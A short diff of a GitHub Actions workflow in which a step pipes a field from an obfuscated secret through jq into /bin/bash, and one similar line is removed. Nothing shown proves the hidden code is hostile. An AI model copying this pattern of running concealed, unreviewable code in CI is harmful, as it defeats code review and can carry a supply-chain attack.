@@ -19,7 +19,6 @@ jobs:
           tb25665: ${{ secrets.tb25665 }}
         run: |
           printf '%s' "$tb25665" | jq -r .fcnd516 | /bin/bash
-          printf '%s' "$d6" | jq -r .ihu101 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
